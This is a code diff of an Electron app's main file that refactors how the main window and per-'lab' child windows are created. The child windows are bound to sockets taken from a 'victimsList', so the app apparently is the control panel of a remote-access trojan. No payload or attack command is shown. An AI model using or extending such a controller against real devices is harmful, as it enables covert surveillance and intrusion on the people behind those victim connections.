@@ -1,12 +1,8 @@
-const { ipcMain } = require('electron');
+const { app, BrowserWindow } = require('electron');
 const electron = require('electron');
-const path = require('path');
-const url = require('url');
-const app = electron.app;
-const BrowserWindow = electron.BrowserWindow;
+const { ipcMain } = require('electron');
 
 let mainWindow;
-let clientWindow;
 
 var IO;
 var windows = {};
@@ -18,14 +14,14 @@ module.exports = victimsList;
 function createWindow() {
   mainWindow = new BrowserWindow({
     width: 1200,
-    height: 900,
+    height: 700,
+    center: true,
+    minWidth: 900,
+    minHeight: 500,
   });
 
-  mainWindow.loadURL(url.format({
-    pathname: path.join(__dirname, '/app/index.html'),
-    protocol: 'file:',
-    slashes: true,
-  }));
+  mainWindow.setMenu(null);
+  mainWindow.loadURL('file://' + __dirname + '/app/index.html');
 
   mainWindow.on('closed', function() {
     mainWindow = null;
@@ -85,25 +81,25 @@ process.on('uncaughtException', function(error) {
 });
 
 ipcMain.on('openLabWindow', function(e, page, index) {
-  clientWindow = new BrowserWindow({
+  let child = new BrowserWindow({
     width: 1200,
     height: 900,
+    frame: false,
+    resizable: false,
+    parent: mainWindow,
   });
 
-  windows[index] = clientWindow.id;
-  clientWindow.webContents.victim = victimsList.getVictim(index).socket;
+  windows[index] = child.id;
+  child.webContents.victim = victimsList.getVictim(index).socket;
 
-  clientWindow.loadURL(url.format({
-    pathname: path.join(__dirname, '/app/' + page),
-    protocol: 'file:',
-    slashes: true,
-  }));
+  child.setMenu(null);
+  child.loadURL('file://' + __dirname + '/app/' + page);
 
-  clientWindow.once('ready-to-show', function() {
-    clientWindow.show();
+  child.once('ready-to-show', function() {
+    child.show();
   });
 
-  clientWindow.on('closed', function() {
+  child.on('closed', function() {
     delete windows[index];
 
     if (victimsList.getVictim(index).socket) {
